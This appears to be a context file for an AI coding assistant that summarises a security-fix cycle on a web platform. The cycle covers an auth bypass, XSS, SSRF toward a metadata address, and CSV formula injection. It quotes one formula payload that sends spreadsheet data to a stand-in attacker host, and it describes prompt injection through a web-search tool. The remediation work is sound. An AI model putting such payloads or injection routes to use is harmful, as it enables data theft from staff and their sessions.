# Intelligence by Position2 - Full Context (v31 - September 2026)

Paste this entire file at the start of a new chat to give the assistant full context on this platform. **v31 supersedes all earlier context files (v1-v30)** - older versions are stale; ignore any pasted copy, and if `CONTEXT_FOR_NEW_CHAT_V30.md` (or older) still exists in the repo, delete it as part of landing this file per the standing one-canonical-file convention.

**Latest `main` HEAD: `a464845`** (always `git pull` to confirm; Railway auto-deploys every push). `app.py` is **18,848 lines / 237 `@app.route` decorator lines**, up from 18,571 / 224 at v30. The test suite is now **186 files, 4,883 tests collected clean, 4,799 passed / 84 skipped** (`PYTHONDONTWRITEBYTECODE=1 python3 -B -m pytest tests/ -q`; v30 reported 171 files / 4,378 tests), up from 171/4,378 at v30. At least 25 routes carry `@admin_required` (the only count this doc's own test, `test_admin_access.py`, actually asserts is a lower bound; treat any exact figure as unverified without re-checking).

**What this cycle was:** a security-scan pass using the official `claude-security` Claude Code plugin, run in five small phases (the user's explicit ask, after an earlier whole-repo attempt at `medium` effort mass-failed on the account's usage/session limit twice in a row and burned real quota for zero findings - see `[[feedback-workflow-rate-limit-retries]]`). Each phase scoped to roughly 15-190 files at `effort: "low"`, confirmed with the user before launching, findings fixed and the full suite re-run green before moving to the next phase. **Nine real vulnerabilities found and fixed**, all verified by execution (not just code review) and covered by the full test suite staying green throughout: two HIGH authentication bypasses in `app.py` (a hardcoded, checked-in fallback `SECRET_KEY` and an unverified-JWT `/auth/google` fallback when `GOOGLE_CLIENT_ID` is unset - both now fail closed at startup/request time instead of degrading silently), three HIGH stored-XSS findings (`templates/ppc_chat_widget.html`'s Vimi chat widget rendered AI/user text through `innerHTML` with zero escaping; `static/js/linkedin.js`'s Company Leaderboard escaped HTML but not the single quote needed to stay inside an inline `onclick` handler's JS string, in two places), one HIGH SSRF (`visitor_intelligence/free_enrich.py` fetched a "company domain" derived from a visitor's reverse-DNS, which is attacker-steerable via a self-service PTR record, straight into `urllib` with no IP allowlist - fixed by routing through the repo's existing `tracker/event_intel_http.public_get`), and three MEDIUM CSV formula-injection findings across Event & Conference Intelligence's three CSV exports (scraped/third-party event and roster text went into cells unescaped, unlike Company/People Intelligence's export, which already uses the `_csv_safe()` helper these three now also use). Full commit list: `ce2e6c1`, `58d42c2`, `628c206`, `c350dab`, `a464845`. A `tests/`-scoped sixth phase (186 files) returned zero findings, as expected under `focus: "attack-surface"`, which treats test code as background rather than an audit target.

**Still open from the v30 audit's four findings, NOT touched this cycle:** no CSRF token, no explicit `SESSION_COOKIE_SECURE`/`SAMESITE`, `X-Forwarded-For` trusted with no `ProxyFix`, no CSP/HSTS/`X-Content-Type-Options` response headers. See OPEN ITEMS item 29 below, updated this cycle to reflect what's now fixed vs. still open.

The transferable lesson this cycle adds: **a mass "session limit" failure on a background scan/workflow run is not a sign to retry harder.** A `Workflow` resume only replays already-*completed* work from cache; anything that errored (including "hit the limit") re-runs from scratch on every resume, so retrying immediately after a limit-out just re-spends into the same wall and can push the quoted reset time later, not sooner (confirmed twice in the same prior session before this cycle switched to the small-phased approach that worked). See `[[feedback-workflow-rate-limit-retries]]`.

---

## WHAT V31 ADDS ON TOP OF V30

**Five (then six) small, user-confirmed `claude-security` scan phases, each fixed and tested before the next launched**, replacing an earlier same-session attempt at one whole-repo `medium`-effort scan that mass-failed twice on the account's usage limit for zero findings. Every fix below was verified by actually executing the changed code path (a Node harness for the two JS-side XSS fixes, mocked DNS resolution for the SSRF fix, a route-level Flask test client call for the CSV fixes), not by code review alone, and the full 4,799-test suite was re-run green after every single fix before it was pushed.

- **Phase 1 (`app.py` + `tracker/`, 88 files) - `ce2e6c1`, then CSV fixes in `a464845`:**
  - **F1, HIGH:** `app.secret_key` fell back to a literal, checked-in dev secret (`"cst-dev-secret-do-not-use-in-prod-abc123xyz"`) whenever `SECRET_KEY` was unset, silently signing every session cookie with a value anyone who has read this source code knows. Fixed: the app now **raises at import time and refuses to start** if neither `SECRET_KEY` nor `FLASK_SECRET_KEY` is set (the fix also closed a real, separate bug this exposed: `conftest.py` only ever set `FLASK_SECRET_KEY` for local test runs, which `app.py` never actually read despite the README documenting both names as accepted - CI happened to mask this by also exporting `SECRET_KEY` directly).
  - **F2, HIGH:** `/auth/google` decoded the client-supplied credential with plain base64 and trusted its `email` claim with **no signature verification** whenever `GOOGLE_CLIENT_ID` was unset, letting anyone log in as any email (including an admin's) by POSTing a self-made, unsigned JWT-shaped payload. Fixed: the route now returns `503` and refuses all sign-ins when `GOOGLE_CLIENT_ID` is unset, instead of decoding unverified.
  - **F3/F4/F5, MEDIUM (fixed in a later pass, `a464845`):** `candidates.csv`, `outreach.csv` and the roster `export.csv` (all three Event & Conference Intelligence CSV exports) wrote scraped/third-party text (event names, exhibitor/sponsor/speaker self-submitted fields) straight into cells with no formula-neutralization. A name like `=HYPERLINK("https://attacker.example/leak?"&A1)` would auto-evaluate when a staffer opened the export in Excel/Sheets. Fixed by routing every data-row cell through the app's existing `_csv_safe()` helper (already used by Company/People Intelligence's export), plus a new route-level regression test in `tests/test_event_intel_routes.py`.
- **Phase 2 (`apps/` + `templates/`, 78 files) - `58d42c2`:** **F1, HIGH**, stored/reflected XSS in `templates/ppc_chat_widget.html` (the Vimi PPC chat widget). `addMsg`/`streamIn`/`finishStream` all assigned `fmt(citeify(text))` (or `fmt(text)` for a staff member's own typed message) straight into `bub.innerHTML`; neither `fmt()` nor `citeify()` HTML-escapes anything. An OpenAI assistant reply that reproduces attacker-supplied markup (e.g. via an indirect prompt-injection payload on a page the model's `web_search` tool reads) executes as live JS in the viewer's authenticated `@position2.com` session. Fixed by routing text through the file's own existing `esc()` helper before `citeify()`/`fmt()` at all three call sites.
- **Phase 3 (`static/` + `scripts/`, 67 files) - `628c206`:** **F1 + F2, both HIGH**, the same quote-breakout XSS pattern at two sites in `static/js/linkedin.js` (the LinkedIn Intelligence dashboard's "Top Companies by Engagement" leaderboard, Overview tab and People tab). The leaderboard interpolates an attacker-controllable LinkedIn "Current Company Name" (any public LinkedIn user who engages with a tracked post) into a single-quoted JS string inside an inline `onclick`, using only `esc()` - which escapes `&`/`<`/`>`/`"` but never the single quote. A company name containing a quote-breakout payload terminates the JS string early and runs as live JS in an authenticated staff session. Fixed using the file's own existing `jsstr()` helper (already used correctly at other `onclick` sites in the same file): `esc(jsstr(name))`.
- **Phase 4 (`visitor_intelligence/` + `ad_intelligence/`, 14 files) - `c350dab`:** **F1, HIGH**, SSRF in `visitor_intelligence/free_enrich.py`'s free-tier company enrichment. `_fetch()` used plain `urllib` against a "company domain" that is not a fixed, trusted value - `resolver.py`'s identification path builds it primarily from reverse DNS (PTR) of a visitor's own source IP, which alone clears the identification threshold, and reverse DNS is self-service-settable on many VPS/hosting providers without proving domain ownership. An attacker who controls both the PTR record and the forward DNS for a domain they own can make the platform's own server fetch an internal/cloud-metadata address (e.g. `169.254.169.254`). Fixed by routing `_fetch()` through `tracker/event_intel_http.py`'s `public_get()`, the same SSRF-safe fetcher this codebase already uses for other attacker-influenceable fetches (event/organizer page harvesting, social-post image fetch), which resolves and validates the destination IP as public before connecting and again on every redirect.
- **Phase 5 (`tests/`, 186 files):** zero findings, as expected - `focus: "attack-surface"` treats test code as background, not an audit target.

**Why small phases this time:** the same session had earlier attempted one whole-repo scan at `medium` effort and it mass-failed on the account's usage/session limit twice in a row (673 then 912 agents dispatched, only 38 then 57 completed, the rest erroring on the limit) for zero verified findings across roughly 5.9M subagent tokens - see `[[feedback-workflow-rate-limit-retries]]` for the full account and the lesson it produced. Switching to `effort: "low"` scoped to one or two top-level directories at a time (15-190 files each) let every phase actually complete cleanly (0 agent errors in every phase that ran) and produced real, verified findings instead.
...
29. **Advisory security/design audit: the REVIEW happened at v30, and a `claude-security`-plugin scan at v31 both reviewed AND FIXED nine real vulnerabilities (see "WHAT V31 ADDS" above) - but v30's four original findings are only PARTIALLY closed.** `SECRET_KEY`'s hardcoded fallback and `GOOGLE_CLIENT_ID`-unset unverified-login fallback are FIXED (both now fail closed) as of v31. **Still open, not touched at v31 either:** no CSRF token, no explicit `SESSION_COOKIE_SECURE`/`SAMESITE`, `X-Forwarded-For` trusted with no `ProxyFix`, no security response headers (CSP/HSTS/`X-Content-Type-Options`). CSS token convergence and accessibility were NOT part of either audit's scope and remain untouched open items.
32. **Rotate the GitHub token again after the v31 security-fix cycle** - the same PAT was used across all six pushes in that session (`ce2e6c1` through `a464845`); standard per-session rotation discipline applies (see item 1).
